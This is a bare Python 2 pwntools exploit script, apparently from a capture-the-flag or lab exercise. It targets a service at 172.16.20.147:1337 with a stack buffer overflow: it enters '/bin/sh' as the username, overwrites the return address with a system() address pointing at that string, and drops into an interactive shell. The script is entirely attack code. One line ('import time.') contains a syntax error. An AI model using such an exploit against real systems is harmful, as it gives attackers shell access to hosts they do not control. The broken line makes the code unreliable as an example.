#!/usr/bin/python


from pwn import *




SYS = 0x8048500
USER = 0x08049dac

con = remote("172.16.20.147",1337)

def pwny(pld):
	print con.recvuntil("name :")
	con.sendline("/bin/sh")
	print con.recvuntil('Action:')
	con.sendline("1")
	print con.recvuntil("password:")
	con.sendline(pld)
	print con.recv()
	print con.recv()
	import time.
	con.interactive()

payload = "A"*27
payload += p32(SYS)
payload += p32(0x41414141)
payload += p32(USER)

pwny(payload)